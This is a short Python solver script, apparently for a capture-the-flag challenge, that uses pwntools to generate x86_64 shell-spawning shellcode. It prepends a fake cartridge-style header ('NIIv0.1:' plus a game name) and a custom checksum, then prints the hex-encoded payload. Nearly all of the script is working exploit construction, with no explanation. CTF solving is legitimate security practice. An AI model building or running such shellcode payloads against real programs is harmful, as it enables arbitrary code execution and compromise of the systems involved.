#!/usr/bin/python3
#Author: n0tM4l4f4m4
#Title: solver.py

import struct
import codecs
import binascii
from pwn import *

context.arch = "x86_64"
context.endian  = "little"

str_v = 'NIIv0.1:'
game_1 = 'TwltPrnc'
game_2 = 'MaroCart'
game_3 = 'Fitnes++'
game_4 = 'AmnlXing'

shell_ = asm(shellcraft.sh())

checksum = 0

for val in shell_:
    # print(val)
    v7 = val
    # v7 = ord(val)
    for val2 in range(7, -1, -1):
        if checksum >= 0x80000000:
            v10  = 0x80000011
            pass
        else:
            v10 = 0
            pass
        pass
        v12 = 2 * checksum
        v12 = (v12 & 0xffffff00) | (((v7 >> val2) & 1 ^ v12) & 0xff)
        checksum = v10 ^ v12
    pass

header = struct.pack("<L", checksum)

# print(str_v, game_4, header, shell_)
print(binascii.hexlify(bytes(str_v, 'utf-8') + bytes(game_4, 'utf-8') + header + shell_).upper())
